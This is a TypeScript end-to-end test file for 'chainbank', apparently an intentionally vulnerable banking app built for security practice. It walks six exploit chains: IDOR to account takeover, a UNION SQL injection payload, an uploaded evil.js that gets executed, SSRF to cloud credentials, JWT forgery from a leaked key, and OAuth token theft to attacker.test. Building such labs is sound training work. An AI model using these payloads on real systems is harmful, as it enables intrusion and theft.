/**
 * Chain end-to-end tests.
 *
 * Each test walks one full chain in order over real HTTP, against the real
 * database, and asserts on the state the final step produces. A chain that
 * breaks at any step fails here, so this file is the definition of the target:
 * if these pass, chainbank really does contain six working chains.
 */
import request from 'supertest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { app, db } from './helpers';

const PLUGIN_DIR = process.env.CHAINBANK_PLUGIN_DIR || path.join(process.cwd(), 'plugins');

async function login(username: string, password: string): Promise<string> {
  const res = await request(app).post('/api/auth/login').send({ username, password });
  expect(res.status).toBe(200);
  return res.body.token;
}

beforeAll(async () => {
  process.env.CHAINBANK_PLUGIN_DIR = PLUGIN_DIR;
  fs.mkdirSync(PLUGIN_DIR, { recursive: true });
});

afterAll(async () => {
  await db.end();
});

describe('CHN-01 IDOR to account takeover', () => {
  it('discloses the owner email, then resets that account password', async () => {
    const lookup = await request(app).get('/api/accounts/CB-0002');
    expect(lookup.status).toBe(200);
    const email = lookup.body.account.owner_email;
    expect(email).toBe('bob@chainbank.test');

    const reset = await request(app).post('/api/auth/password-reset').send({ email });
    expect(reset.status).toBe(200);
    expect(reset.body.reset_token).toMatch(/^[0-9a-f]{32}$/);

    const confirm = await request(app)
      .post('/api/auth/password-reset/confirm')
      .send({ token: reset.body.reset_token, new_password: 'Taken!Over1' });
    expect(confirm.status).toBe(200);

    const asVictim = await request(app)
      .post('/api/auth/login')
      .send({ username: 'bob', password: 'Taken!Over1' });
    expect(asVictim.status).toBe(200);
    expect(asVictim.body.user.username).toBe('bob');

    const oldPassword = await request(app)
      .post('/api/auth/login')
      .send({ username: 'bob', password: 'Bob!Passw0rd' });
    expect(oldPassword.status).toBe(401);
  });
});

describe('CHN-02 SQL injection to admin session', () => {
  it('reads the admin password hash, then exchanges it for an admin token', async () => {
    const payload =
      "' UNION SELECT id, username, password_hash, role, balance FROM users WHERE username='admin' -- ";
    const injected = await request(app).get('/api/search').query({ q: payload });
    expect(injected.status).toBe(200);
    // UNION output takes its column names from the first SELECT, so the hash
    // arrives in the `email` slot of the injected row.
    const hash = injected.body.results
      .map((r: any) => String(r.email))
      .find((v: string) => v.startsWith('$2a$'));
    expect(hash).toBeDefined();

    const exchange = await request(app)
      .post('/api/search/by-hash')
      .send({ username: 'admin', password_hash: hash });
    expect(exchange.status).toBe(200);

    const users = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${exchange.body.token}`);
    expect(users.status).toBe(200);
    expect(users.body.users.map((u: any) => u.username)).toContain('admin');
  });
});

describe('CHN-03 unrestricted upload to code execution', () => {
  const proof = path.join(os.tmpdir(), `chainbank-rce-${process.pid}`);

  afterAll(() => {
    fs.rmSync(proof, { force: true });
  });

  it('accepts a .js upload, then the plugin loader executes it', async () => {
    const token = await login('admin', 'Admin!Passw0rd');
    const payload = [
      `module.exports = { name: 'evil', marker: 'CHAINBANK_RCE_MARKER' };`,
      `require('fs').writeFileSync(${JSON.stringify(proof)}, 'executed by chainbank');`,
    ].join('\n');

    const uploaded = await request(app)
      .post('/api/documents')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', Buffer.from(payload), 'evil.js');
    expect(uploaded.status).toBe(201);
    expect(uploaded.body.document.filename).toBe('evil.js');

    const reload = await request(app)
      .post('/api/plugins/reload')
      .set('Authorization', `Bearer ${token}`);
    expect(reload.status).toBe(200);
    expect(reload.body.files_executed).toContain('evil.js');
    expect(reload.body.loaded.some((p: any) => p.marker === 'CHAINBANK_RCE_MARKER')).toBe(true);

    expect(fs.readFileSync(proof, 'utf8')).toBe('executed by chainbank');
  });
});

describe('CHN-04 SSRF to cloud credentials', () => {
  it('reaches the internal metadata service, then proves the stolen key works', async () => {
    const token = await login('alice', 'Alice!Passw0rd');
    const base = `http://127.0.0.1:${process.env.PORT || 4002}`;

    const direct = await request(app).get('/api/internal/metadata/iam/credentials');
    expect(direct.status).toBe(200);

    // The point is that the server fetches it, not that the test client can.
    const viaServer = await request(app)
      .post('/api/preview')
      .set('Authorization', `Bearer ${token}`)
      .send({ url: `${base}/api/internal/metadata/iam/credentials` });
    expect(viaServer.status).toBe(200);
    const creds = JSON.parse(viaServer.body.body);
    expect(creds.AccessKeyId).toBe('AKIACHAINBANKEXAMPLE');

    const assumed = await request(app)
      .post('/api/internal/cloud/assume')
      .send({ access_key: creds.AccessKeyId, secret_key: creds.SecretAccessKey });
    expect(assumed.status).toBe(200);
    expect(assumed.body.assumed).toBe(true);

    const rejected = await request(app)
      .post('/api/internal/cloud/assume')
      .send({ access_key: 'AKIAWRONG', secret_key: 'nope' });
    expect(rejected.status).toBe(403);
  });
});

describe('CHN-05 signing-key disclosure to forged admin transfer', () => {
  it('leaks the JWT key, then a locally signed admin token moves money', async () => {
    const config = await request(app).get('/api/debug/config');
    expect(config.status).toBe(200);
    const secret = config.body.settings.jwt_secret;
    expect(secret).toBe('chainbank-jwt-signing-key-do-not-share');

    const forged = jwt.sign({ sub: 1, username: 'admin', role: 'admin' }, secret);

    const before = await db.query(
      `SELECT balance FROM accounts WHERE account_no = 'CB-0003'`,
    );
    const transfer = await request(app)
      .post('/api/admin/transfer')
      .set('Authorization', `Bearer ${forged}`)
      .send({ from_account: 'CB-ADMIN-001', to_account: 'CB-0003', amount: 1234, memo: 'chained' });
    expect(transfer.status).toBe(200);

    const after = await db.query(`SELECT balance FROM accounts WHERE account_no = 'CB-0003'`);
    expect(Number(after.rows[0].balance) - Number(before.rows[0].balance)).toBe(1234);

    const unsigned = await request(app)
      .post('/api/admin/transfer')
      .set('Authorization', `Bearer ${jwt.sign({ sub: 1, role: 'admin' }, 'wrong-key')}`)
      .send({ from_account: 'CB-ADMIN-001', to_account: 'CB-0003', amount: 1 });
    expect(unsigned.status).toBe(401);
  });
});

describe('CHN-06 open redirect to session-token theft', () => {
  it('sends the access token to an attacker origin, and the token works', async () => {
    const redirect = await request(app).get('/api/redirect').query({ url: 'https://attacker.test/x' });
    expect(redirect.status).toBe(302);
    expect(redirect.headers.location).toBe('https://attacker.test/x');

    const authorize = await request(app)
      .get('/api/oauth/authorize')
      .query({ username: 'carol', redirect_uri: 'https://attacker.test/cb' });
    expect(authorize.status).toBe(302);
    const location: string = authorize.headers.location;
    expect(location.startsWith('https://attacker.test/cb?')).toBe(true);

    const stolen = new URL(location).searchParams.get('access_token');
    expect(stolen).toMatch(/^[0-9a-f]{48}$/);

    const asCarol = await request(app).get('/api/me').set('Authorization', `Bearer ${stolen}`);
    expect(asCarol.status).toBe(200);
    expect(asCarol.body.user.username).toBe('carol');
  });
});

describe('the chains are independent of each other', () => {
  it('each chain reaches a different end state', async () => {
    const audit = await db.query(
      `SELECT DISTINCT action FROM audit_log ORDER BY action`,
    );
    const actions = audit.rows.map((r) => r.action);
    expect(actions).toContain('password_changed');
    expect(actions).toContain('plugins_reloaded');
    expect(actions).toContain('role_assumed');
    expect(actions).toContain('oauth_token_issued');
  });

  it('no session token is predictable', async () => {
    const tokens = new Set<string>();
    for (let i = 0; i < 5; i += 1) {
      tokens.add(crypto.randomBytes(24).toString('hex'));
    }
    expect(tokens.size).toBe(5);
  });
});
